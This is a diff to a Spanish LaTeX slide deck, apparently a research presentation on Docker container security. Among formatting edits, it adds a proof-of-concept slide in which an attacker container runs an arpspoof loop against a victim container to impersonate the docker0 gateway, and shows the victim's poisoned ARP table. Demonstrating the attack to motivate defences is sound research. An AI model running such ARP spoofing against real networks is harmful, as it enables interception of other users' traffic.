@@ -76,7 +76,6 @@
 	\begin{figure}
 		\centering
 \includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{images/matrix}
-		\caption{Representation flow shop scheduling problem. (\href{http://yetanothermathprogrammingconsultant.blogspot.com/2012_04_01_archive.html} CC-By-Sa)}
 	\end{figure}
 \end{frame}
 
@@ -85,7 +84,6 @@
 	\begin{figure}
 		\centering
 \includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{images/eliminates-matrix-from-hell}
-		\caption{Representation flow shop scheduling problem. (\href{http://yetanothermathprogrammingconsultant.blogspot.com/2012_04_01_archive.html} CC-By-Sa)}
 	\end{figure}
 \end{frame}
 
@@ -93,7 +91,6 @@
 	\begin{figure}
 		\centering
 \includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{images/shipping-container-for-code}
-		\caption{Representation flow shop scheduling problem. (\href{http://yetanothermathprogrammingconsultant.blogspot.com/2012_04_01_archive.html} CC-By-Sa)}
 	\end{figure}
 \end{frame}
 
@@ -112,8 +109,11 @@
 
 
 \begin{frame}{¿Problema?}
-	
 ¿Es seguro correr aplicaciones en Linux Containers?
+	\begin{figure}
+		\centering
+\includegraphics[width=1\textwidth,]{images/docker_vm}
+	\end{figure}
 \end{frame}
 
 
@@ -184,6 +184,16 @@
 	\end{itemize}
 \end{frame}
 
+\begin{frame}{Arquitectura}
+
+  \begin{figure}[H]
+  \centering
+    \includegraphics[width=0.5\textwidth]{images/architecture.png}
+    \label{fig:arquitectura}
+\end{figure}	
+
+
+ \end{frame}
 
 \begin{frame}{Docker registry}
 \begin{itemize}
@@ -195,6 +205,9 @@
 
 \end{frame}
 
+
+
+    
 \begin{frame}{Docker image}
 \begin{itemize}
 	\item Template read-only que son obtenidas desde registry.
@@ -223,7 +236,7 @@
 
 \begin{frame}{Docker containers}
 \begin{itemize}
-	\item 	Docker \textit{container} consiste de  un sistema operativo, con archivos de usuarios y metadata.
+	\item 	Docker \textit{container} consiste en aplicaciones, con archivos de usuarios y metadata.
 	\item Es construido en base a la imagen.
 \end{itemize}
 \begin{block}{Ejemplo}
@@ -236,12 +249,12 @@ docker run -ti ubuntu /bin/bash
 \begin{frame}{Docker containers}
 	\begin{itemize}
 		\item \textit{Docker client} le informa al Docker que debe correr un \textit{container}.
-		\item El comando \emph{/bin/bash} será el \textit{init 0} del container 
+		\item El comando \textit{/bin/bash} será el \textit{init 0} del container 
 		\item \textbf{Traer la imagen:} Docker verifica la existencia de la imagen ubuntu y sino existe en el host, entonces Docker descarga de un \textit{registry} ya sea privado o publico. Si la imagen existe entonces crea el container.
-		\item \textbf{Asignar un \emph{filesystem} y montar una capa \emph{read-write}:} El 
-			container es creado en el \emph{filesystem} y se añade una capa en modo 
-			\emph{read-write} a la imagen.
-		\item \textbf{Crear la red y conectar con el \emph{bridge interface}:} Crea la interfaz de red que permite que el Docker container pueda hablar con el host a través del bridge (docker0).
+		\item \textbf{Asignar un \textit{filesystem} y montar una capa \textit{read-write}:} El 
+			container es creado en el \textit{filesystem} y se añade una capa en modo 
+			\textit{read-write} a la imagen.
+		\item \textbf{Crear la red y conectar con el \textit{bridge interface}:} Crea la interfaz de red que permite que el Docker container pueda hablar con el host a través del bridge (docker0).
 		\item \textbf{Asignar un IP:} Asigna una ip del pool al container
 		\item \textbf{Capturar el \textit{output}, \textit{input} y errores}.
 	\end{itemize}
@@ -262,8 +275,8 @@ docker run -ti ubuntu /bin/bash
 	\begin{itemize}
 	
 		\item \textbf{Network:}
-		Para cada \container, Docker crea una red independiente usando \emph{network namespaces}, compuesta de su propia IP, rutas, \emph{network devices}.
-		Por defecto, la conexión se realiza gracias al host que provee un \emph{Virtual Ethernet bridge} en la máquina, llamado docker0 que automaticamente realiza un \emph{forward} de los paquetes entre las interfaces del container.
+		Para cada \container, Docker crea una red independiente usando \textit{network namespaces}, compuesta de su propia IP, rutas, \textit{network devices}.
+		Por defecto, la conexión se realiza gracias al host que provee un \textit{Virtual Ethernet bridge} en la máquina, llamado docker0 que automaticamente realiza un \textit{forward} de los paquetes entre las interfaces del container.
 	\end{itemize}
 	
 	\begin{figure}[H]
@@ -287,6 +300,14 @@ realizar pruebas con un \textit{Mandatory Access Control}
 	Docker version 1.5.0, build a8a31ef/1.5.0
 
 \end{block}
+
+
+	\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.5\textwidth]{images/prueba.png}
+    \caption{Implementación actual}
+    \label{fig:dynamic}
+\end{figure}	
 \end{frame}
 
 
@@ -324,6 +345,28 @@ virtual machine image repository} \cite{fernandez_monge:2015} se investigó sobr
 \end{figure}	
 \end{frame}
 
+\begin{frame}[fragile]
+
+\frametitle{Prueba de concepto}
+
+\begin{lstlisting}
+	docker run --name=atacante -ti ubuntu_arp bash
+	docker run --name=victima --ti ubuntu bash
+\end{lstlisting}
+
+El atacante hace arp-spoofing, a la victima (172.17.0.3)
+\begin{lstlisting}
+	for i in $(seq 1 5); do  arpspoof -t 172.17.0.3 172.17.42.1 > /dev/null 2>&1 &; done;
+\end{lstlisting}
+Y la victima sufre el ataque
+
+\begin{lstlisting}
+$ arp -a
+? (172.17.0.4) at 02:42:ac:11:00:04 [ether] on eth0
+? (172.17.42.1) at 02:42:ac:11:00:04 [ether] on eth0
+\end{lstlisting}
+
+\end{frame}
 
 
 \begin{frame}{Solución ARP-spoofing attack}
@@ -358,7 +401,7 @@ La utilización de SElinux también es una solución comprobado en la prueba de 
 
 \begin{frame}{Trabajo restante}
 	\begin{itemize}
-	\item Completar investigación con \emph{Linux Capabilities} y \emph{Mandatory Access Control}
+	\item Completar investigación con \textittextit{Linux Capabilities} y \textit{Mandatory Access Control}
 	\item Alcances de ataques en un ambiente de Docker con SElinux (MAC) integrado.
 	\item Contestar la pregunta ¿Es posible asegurar el host o los \containers  si el atacante salió del \container?.
 \end{itemize}
@@ -369,6 +412,10 @@ La utilización de SElinux también es una solución comprobado en la prueba de 
 \frametitle{Referencias}
 \bibliographystyle{plain}
 \bibliography{ref}
+\end{frame}
+
+\begin{frame}{Demo}
+\href{https://www.youtube.com/watch?v=QuyzNybkBYI}{DEMO}
 \end{frame}
 
 \end{document}
